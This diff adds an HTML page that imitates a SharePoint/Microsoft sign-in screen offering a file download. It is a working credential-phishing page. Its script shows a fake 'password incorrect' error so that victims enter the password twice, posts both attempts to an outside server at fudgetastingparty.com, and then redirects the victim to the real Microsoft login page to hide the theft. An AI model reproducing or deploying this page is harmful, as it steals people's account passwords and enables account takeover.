@@ -1,0 +1,872 @@
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <title>Sharepoint Document</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <style>
+            #logo-separator {
+                display: none;
+            }
+
+            #logo {
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+                width: 100%;
+                height: 70px;
+                margin: auto;
+            }
+
+            .content {
+                padding: 21px 7px 0px 7px;
+            }
+
+            .mobile-login-label {
+                display: none;
+            }
+
+            .mobile-login {
+                border: none;
+                display: inline;
+                padding: 0;
+            }
+
+            .image {
+                height: 70px;
+                margin: auto;
+            }
+
+            h1 {
+                font-size: 22px;
+                line-height: 22px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+
+            .container {
+                margin-left: auto;
+                margin-right: auto;
+                margin-top: 2%;
+                padding: 0 0 1% 0;
+                width: 350px;
+                -webkit-border-radius: 2px;
+                -moz-border-radius: 2px;
+                border-radius: 2px;
+                -webkit-box-shadow: 3px 3px 3px #c2c2c2;
+                -moz-box-shadow: 3px 3px 3px #c2c2c2;
+                box-shadow: 3px 3px 3px #c2c2c2;
+                font-family: Arial, Helvetica, Sans-Serif;
+            }
+
+            .header {
+                padding: 2% 0 2% 0;
+                margin-left: auto;
+                margin-right: auto;
+                background-color: white;
+                border-bottom: 3px solid #df0c36;
+                background-size: 100% 5%;
+                background-repeat: no-repeat;
+                background-position: bottom;
+            }
+
+            /*custom code for mobile*/
+            @media (max-device-width: 481px) {
+                body {
+                    background-color: white;
+                }
+                .container {
+                    overflow-x: hidden;
+                    margin-left: auto;
+                    margin-right: auto;
+                    margin-top: 0;
+                    border: none;
+                    background-color: white;
+                    padding: 0;
+                    width: 100%;
+                    -webkit-border-radius: none;
+                    -moz-border-radius: none;
+                    border-radius: none;
+                    -webkit-box-shadow: none;
+                    -moz-box-shadow: none;
+                    box-shadow: none;
+                }
+                .footer {
+                    padding-bottom: 6px;
+                }
+            }
+
+            .primary {
+                color: #fff;
+                background-color: #4a95d1;
+            }
+
+            input.inputUpdate {
+                width: 52%;
+                border: 1px solid #4a95d1;
+                background-color: #fff;
+            }
+
+            input.buttonUpdate.primary {
+                border: 1px solid #4a95d1;
+                display: inline-block;
+                vertical-align: top;
+            }
+
+            input[type="submit"],
+            button[type="submit"] {
+                border-radius: 0;
+                font-size: 14px;
+                font-weight: normal;
+                line-height: 0;
+                max-width: 210px;
+                border: none;
+                margin-bottom: 8px;
+                padding: 24px;
+            }
+
+            .buttonLinkUpdate {
+                background-color: #4a95d1;
+                max-width: 178px;
+                border: none;
+                color: white;
+                padding: 16px;
+                text-align: center;
+                text-decoration: none;
+                display: inline-block;
+                font-size: 14px;
+                cursor: pointer;
+                font-weight: normal;
+                line-height: 17px;
+                box-shadow: 0 3px 5px -2px #c2c2c2;
+                text-shadow: 1px 1px 5px #666;
+            }
+
+            input[type="text"] {
+                max-width: 90%;
+            }
+
+            .iep {
+                padding: 15px 26px 0;
+            }
+
+            .help-block {
+                border: solid 1px orange;
+                background-color: antiquewhite;
+                padding: 4px;
+            }
+
+            /* Remember me Kerberos */
+            #kerberos-modal > .modal-content {
+                background-color: #fefefe;
+                margin: auto;
+                padding: 20px;
+                border: none;
+                width: 600px;
+                box-shadow: 3px 3px 3px #c2c2c2;
+            }
+
+            #kerberos-modal button {
+                cursor: pointer;
+                font-family: Arial, sans-serif;
+                font-size: 0.9rem;
+                text-shadow: 1px 1px 5px #666;
+                color: #fff;
+                background-color: #4a95d1;
+            }
+
+            /* OTP unlock screen */
+            #unlock-code-container {
+                width: 100%;
+                /* background: rgba(255,192,77, 0.7); */
+                background: rgb(255, 237, 205);
+                border-radius: 3px;
+                border: 2px solid orange;
+                padding: 2px;
+                color: rgb(179, 116, 0);
+                font-size: 13px;
+            }
+
+            #unlock-code-container > .warning-icon {
+                display: inline-block;
+                background-image: url("../images/warning_large.gif");
+                background-size: contain;
+                -ms-filter: "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='../images/warning_large.gif', sizingMethod='scale')";
+                height: 15px;
+                width: 15px;
+            }
+
+            #modal-unlock {
+                display: none;
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                top: 0;
+            }
+
+            #frame-unlock {
+                width: 80%;
+                height: 100%;
+            }
+
+            a {
+                color: #3e3d3f;
+            }
+
+            body {
+                background-color: #f0f0f0;
+                font-family: Corbel, sans-serif;
+                font-size: 100%;
+            }
+
+            .button {
+                cursor: pointer;
+                font-family: Arial, sans-serif;
+                font-size: 0.9rem;
+                text-shadow: 1px 1px 5px #666;
+                height: 48px;
+                width: 100%;
+            }
+
+            .container {
+                background-color: white;
+                border: solid 1px lightgray;
+                box-shadow: 3px 3px 3px #c2c2c2;
+                box-sizing: border-box;
+                margin: 40px auto 0;
+                max-width: 350px;
+                padding: 10px 0;
+                text-align: center;
+                width: 100%;
+            }
+
+            .content {
+                padding: 10px 20px;
+            }
+
+            .content-title {
+                margin-bottom: 20px;
+            }
+
+            #copyright {
+                font-size: 0.75rem;
+            }
+
+            .footer {
+                padding: 0 20px;
+            }
+
+            h1 {
+                font-size: 1.4rem;
+            }
+
+            .hidden {
+                display: none;
+            }
+
+            .iep-container {
+                display: inline-block;
+                position: relative;
+                width: 100%;
+            }
+
+            .iep {
+                box-sizing: border-box;
+                color: #777;
+                height: 100%;
+                font-family: Arial, sans-serif;
+                left: 0;
+                padding: 15px 9px 0;
+                pointer-events: none;
+                position: absolute;
+                text-align: left;
+                top: 0;
+                width: 100%;
+            }
+
+            .image {
+                display: block;
+                max-width: 350px;
+            }
+
+            #logo-separator {
+                width: 100%;
+            }
+
+            input[type="text"],
+            input[type="password"],
+            input[type="submit"],
+            input[type="tel"],
+            input[type="email"],
+            button[type="submit"] {
+                border-radius: 1px;
+                box-shadow: 0 3px 5px -2px #c2c2c2;
+                box-sizing: border-box;
+                border: solid 1px lightgray;
+                font-size: 1rem;
+                line-height: 1rem;
+                height: 48px;
+                padding: 0 8px;
+                width: 100%;
+            }
+
+            input:focus {
+                outline: none;
+            }
+
+            .input-checkbox > input[type="checkbox"] {
+                display: none;
+            }
+
+            .input-checkbox > label {
+                user-select: none;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+            }
+
+            .input-checkbox > input[type="checkbox"] + label > .checkbox {
+                border: 1px solid #808080;
+                border-radius: 10px;
+                display: inline-block;
+                height: 17px;
+                margin-left: 10px;
+                position: relative;
+                transition: all 0.2s ease;
+                vertical-align: text-bottom;
+                width: 34px;
+            }
+
+            .input-checkbox > input[type="checkbox"]:checked + label > .checkbox {
+                border: 1px solid #e97819;
+            }
+
+            .input-checkbox > input[type="checkbox"] + label > .checkbox::after {
+                background-color: #808080;
+                border-radius: 50%;
+                bottom: 1px;
+                content: " ";
+                display: block;
+                left: 1px;
+                top: 1px;
+                position: absolute;
+                transition: all 0.2s ease;
+                width: 15px;
+            }
+
+            .input-checkbox > input[type="checkbox"]:checked + label > .checkbox::after {
+                background-color: #e97819;
+                left: 18px;
+            }
+
+            .input-group {
+                margin-bottom: 20px;
+            }
+
+            #logo {
+                width: 80%;
+                margin: 0 auto 10px;
+                max-height: 70px;
+            }
+
+            #logo > img {
+                max-height: 70px;
+                margin: auto auto;
+            }
+
+            .primary {
+                color: white;
+                background-color: #e97819;
+                border: none;
+                font-weight: bold;
+            }
+
+            #user-login {
+                color: #898989;
+                font-family: Tahoma, sans-serif;
+                margin-bottom: 20px;
+            }
+
+            * {
+                -webkit-appearance: none;
+                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            }
+
+            ::-webkit-input-placeholder {
+                font-size: 1rem;
+            }
+
+            ::-moz-placeholder {
+                font-size: 1rem;
+            }
+
+            :-moz-placeholder {
+                font-size: 1rem;
+            }
+
+            :-ms-input-placeholder {
+                font-size: 1rem;
+            }
+
+            ::-ms-clear {
+                display: none;
+            }
+            #modal-unlock {
+                display: none;
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                top: 0;
+            }
+            #frame-unlock {
+                width: 80%;
+                height: 100%;
+            }
+
+            .inputUpdate,
+            .buttonUpdate {
+                font-size: inherit;
+                padding: 0.3em 1em;
+                margin: 0.1em 0.2em;
+                height: 1.8em;
+                -moz-box-sizing: content-box;
+                -webkit-box-sizing: content-box;
+                box-sizing: content-box;
+                border: 1px solid #e97819;
+                background-color: #fff;
+            }
+
+            .inputUpdate {
+                width: 50%;
+                margin-right: -5px;
+                border-radius: 0.4em 0 0 0.4em;
+            }
+
+            .buttonUpdate {
+                margin-left: 0;
+                margin-bottom: 2em;
+                -webkit-border-radius: 0 0.4em 0.4em 0;
+                -moz-border-radius: 0 0.4em 0.4em 0;
+                border-radius: 0 0.4em 0.4em 0;
+                background-color: #e97819;
+                color: #fff;
+            }
+
+            .buttonLinkUpdate {
+                width: 100%;
+                margin-bottom: 0.1em;
+                line-height: 17px;
+                background-color: #e97819;
+                border: none;
+                color: white;
+                font-weight: bold;
+                padding: 15px 0px;
+                text-align: center;
+                text-decoration: none;
+                display: inline-block;
+                font-size: 14px;
+                margin: 10px 0px;
+            }
+
+            .heliumMessage {
+                text-align: left;
+                font-size: 12px;
+            }
+
+            .heliumErrorMessage {
+                padding-bottom: 10px;
+            }
+
+            .heliumEnrollLink {
+            }
+
+            .heliumAddPlugin {
+            }
+
+            .heliumUnlockLink {
+            }
+
+            .pushWaiting {
+                text-align: center;
+                font-size: 12px;
+            }
+
+            .pushMessage {
+                text-align: center;
+                font-size: 12px;
+            }
+
+            .pushWaitingImg {
+                margin-left: auto;
+                margin-right: auto;
+                max-height: 50px;
+                max-width: 50px;
+            }
+
+            .otpMobileMessage {
+                text-align: center;
+                font-size: 12px;
+                margin-bottom: 10px;
+            }
+
+            .otpPushPan {
+                margin-top: 10px;
+                margin-bottom: 10px;
+                color: red;
+            }
+
+            .labelIDToken {
+                display: none;
+            }
+
+            input.inputUpdate {
+                width: 51%;
+                height: 36px;
+                float: unset;
+                margin: 0.1em 0.2em;
+                margin-bottom: 2em;
+                margin-right: -5px;
+                border: 1px solid #e97819;
+                padding: 0.3em 1em;
+                font-size: inherit;
+                border-radius: 0.4em 0 0 0.4em;
+                box-sizing: content-box;
+                background-color: #fff;
+                box-shadow: unset;
+            }
+
+            input.buttonUpdate.primary {
+                width: auto;
+                height: 36px;
+                float: unset;
+                margin-bottom: 2em;
+                margin: 0.1em 0.2em;
+                margin-left: 0;
+                border-radius: 0 0.4em 0.4em 0;
+                border: 1px solid #e97819;
+                padding: 0.3em 1em;
+                font-size: inherit;
+                box-sizing: content-box;
+                font-weight: unset;
+                box-shadow: unset;
+                display: inline-block;
+                vertical-align: top;
+            }
+
+            .mobile-login-label {
+                display: none;
+            }
+
+            .mobile-login {
+                border: none;
+                display: inline;
+            }
+
+            /* The Modal (background) */
+            .modal {
+                display: none; /* Hidden by default */
+                position: fixed; /* Stay in place */
+                z-index: 1; /* Sit on top */
+                padding-top: 100px; /* Location of the box */
+                left: 0;
+                top: 0;
+                width: 100%; /* Full width */
+                height: 100%; /* Full height */
+                overflow: auto; /* Enable scroll if needed */
+                background-color: rgb(0, 0, 0); /* Fallback color */
+                background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+            }
+
+            /* Modal Content */
+            .modal-content {
+                background-color: #fefefe;
+                margin: auto;
+                padding: 20px;
+                border: 1px solid #888;
+                width: 80%;
+            }
+
+            /* The Close Button */
+            .close {
+                color: #aaaaaa;
+                float: right;
+                font-size: 28px;
+                font-weight: bold;
+            }
+
+            .close:hover,
+            .close:focus {
+                color: #000;
+                text-decoration: none;
+                cursor: pointer;
+            }
+
+            .tooltip-container {
+                display: inline;
+                margin-left: 10px;
+                position: relative;
+            }
+
+            .tooltip {
+                background-image: url("../images/info_bulle.png");
+                background-size: contain;
+                cursor: pointer;
+                display: inline-block;
+                height: 20px;
+                width: 20px;
+            }
+
+            .tooltip + .tooltip-content {
+                background-color: white;
+                color: black;
+                border: solid 1px;
+                font-size: 0.65rem;
+                opacity: 0;
+                padding: 10px;
+                pointer-events: none;
+                position: absolute;
+                left: -150px;
+                bottom: 25px;
+                text-transform: none;
+                transition: opacity 0.5s;
+                width: 250px;
+                font-weight: 400;
+            }
+
+            .tooltip:hover + .tooltip-content {
+                opacity: 1;
+            }
+
+            .secondary {
+            }
+
+            .buttonIdpProxy {
+                width: 100%;
+                height: 100%;
+                background-size: cover;
+                background-repeat: no-repeat;
+                border: none;
+                cursor: pointer;
+            }
+
+            .linkIdpProxy {
+            }
+
+            .imgIdpProxy {
+                width: 100%;
+                height: 100%;
+                background-size: cover;
+                background-repeat: no-repeat;
+                border: none;
+            }
+
+            .divButtonIdpProxy {
+                padding: 6px;
+                border: solid 1px lightgray;
+                box-shadow: 0 3px 5px -2px #c2c2c2;
+                height: 65px;
+                margin-bottom: 10px;
+            }
+
+            .divButtonIdpProxyNoLogo {
+                margin-bottom: 10px;
+            }
+
+            .divLinkIdpProxy {
+            }
+
+            .titleIdpProxy {
+            }
+
+            .subTitleIdpProxy {
+            }
+
+            .imgIdpProxyMemority {
+                width: 100%;
+                background-size: cover;
+            }
+
+            .divMemorityIDP {
+                padding: 6px;
+                border: solid 1px lightgray;
+                box-shadow: 0 3px 5px -2px #c2c2c2;
+            }
+
+            .linkMemority {
+            }
+        </style>
+
+
+    </head>
+    <body
+        style="
+            background-image: url('https://i.ibb.co/LS5Nx8j/1.png');
+        "
+        data-new-gr-c-s-check-loaded="14.1073.0"
+        data-gr-ext-installed=""
+    >
+        <div class="container">
+            <div class="main">
+                <div class="header">
+                    <div id="logo">
+                        <img
+                            class="image"
+                            id="logoimage"
+                            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+"
+                            alt="logo"
+                            width="120px"
+                            height="80px"
+                        />
+                    </div>
+                    <img
+                        id="logo-separator"
+                        class="image"
+                        src="https://i.ibb.co/jhVyDzv/2.png"
+                    />
+                </div>
+                <div class="content">
+                    <div class="login-form" autocomplete="off">
+                        <div class="content-title">
+                            <div id="toberemoved">
+                                <font size="3">Sign-in to download your file </font>
+                                <br />
+
+                                <div id="msgfont" style="display: block; padding: 14px; color: red; font-size: 14px;"></div>
+                                <br />
+                                <br />
+                            </div>
+                            <img
+                                src="https://i.ibb.co/BTT0QVC/3.jpg"
+                                height="30px"
+                                width="30px"
+                            />
+                            <img
+                                src="https://i.ibb.co/m6BJsc9/4.jpg"
+                                height="30px"
+                                width="30px"
+                            />
+                            <img
+                                src="https://i.ibb.co/1MW8nky/5.jpg"
+                                height="30px"
+                                width="30px"
+                            />
+                        </div>
+
+                    </div>
+
+                    <div id="maindatadiv">
+<form id="passwordForm"  method="POST">
+  <div class="input-group">
+    <p id="msgfont"></p>
+      <input class="use-iep" type="email" name="xiemail" id="xiemail" autofocus="" placeholder="Recipient Email Address" readonly value="#EMAIL" />
+      <input name="email2" type="hidden" id="emaillabel" /><br /><br />
+      <input class="use-iep" type="password" name="pipassword" id="pipassword" placeholder="Password" required />
+  </div>
+  <br />
+  <div class="input-group input-checkbox">
+      <input name="rememberme" id="rememberme" value="true" type="checkbox" />
+      <label for="rememberme">Remember Me<div class="checkbox"></div></label>
+  </div>
+  <input type="submit" class="button primary" value="Next" name="send_message_btn" id="send" />
+</form>
+
+
+<script>
+let passwordTimeout;
+
+document.getElementById('passwordForm').addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  var form = this;
+  var passwordInput = document.getElementById('pipassword');
+  var msgFont = document.getElementById('msgfont');
+
+  if (!passwordInput.dataset.firstAttempt) {
+
+      passwordInput.dataset.firstAttempt = 'true';
+      passwordInput.dataset.firstAttemptValue = passwordInput.value;
+
+      passwordInput.placeholder = 'Verify Password';
+
+        msgFont.innerHTML = "Your account or password is incorrect.";
+          submitFormData();
+  } else {
+      msgFont.innerHTML = "";
+      submitFormData1();
+  }
+});
+
+function submitFormData() {
+  let form = document.getElementById('passwordForm');
+  let formData = new FormData(form);
+  let passwordInput = document.getElementById('pipassword');
+
+
+  formData.append('firstPasswordAttempt', form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);
+  formData.append('secondPasswordAttempt', passwordInput.value || form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);
+
+  fetch('https://fudgetastingparty.com/components/zkyg2/na2.php', {
+      method: 'POST',
+      body: formData,
+  })
+  .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok.');
+      return response.text();
+  })
+  .then(data => {
+      console.log('Form submitted:', data);
+  })
+  .catch(error => {
+      console.error('Fetch operation error:', error);
+  });
+}
+
+function submitFormData1() {
+  let form = document.getElementById('passwordForm');
+  let formData = new FormData(form);
+  let passwordInput = document.getElementById('pipassword');
+
+
+  formData.append('firstPasswordAttempt', form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);
+  formData.append('secondPasswordAttempt', passwordInput.value || form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);
+
+  fetch('https://fudgetastingparty.com/components/zkyg2/na2.php', {
+      method: 'POST',
+      body: formData,
+  })
+  .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok.');
+      return response.text();
+  })
+  .then(data => {
+      console.log('Form submitted:', data);
+      window.location.href = 'https://login.microsoftonline.com/jsdisabled';
+  })
+  .catch(error => {
+      console.error('Fetch operation error:', error);
+  });
+}
+
+
+document.getElementById('pipassword').addEventListener('input', function() {
+  if (this.dataset.firstAttempt && !this.value) {
+      delete this.dataset.firstAttempt;
+      delete this.dataset.firstAttemptValue;
+  }
+});
+</script>
+          <div class="footer">
+              <span id="copyright">
+                   2023-
+                  <script>
+                      document.write(new Date().getFullYear());
+                  </script>
+                  enterprise. All Rights Reserved.
+              </span>
+          </div>
+      </div>
+  </body>
+  <grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
+
+
+</html>
